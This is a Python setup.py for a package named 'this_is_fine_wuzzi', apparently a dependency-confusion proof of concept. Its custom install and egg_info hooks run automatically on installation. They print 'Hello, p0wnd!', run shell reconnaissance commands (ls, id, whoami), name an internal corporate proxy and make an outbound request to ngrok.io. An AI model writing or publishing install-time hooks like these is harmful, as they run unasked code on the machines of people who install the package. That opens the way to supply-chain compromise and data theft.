from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import subprocess
import requests

def RunCommand():
    print("Hello, p0wnd!")

    command = "ls"
    result = subprocess.check_output(command, shell=True, text=True)
    print(result)
    command = "id"
    result = subprocess.check_output(command, shell=True, text=True)
    print(result)
    command = "whoami"
    result = subprocess.check_output(command, shell=True, text=True)
    print(result)
    proxies = {
        'https': 'http://proxy.hub.gcp.groupement.system-u.fr:80',
    }

    r = requests.get('https://ngrok.io')
    print(r.status_code)
    print(r.text)

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)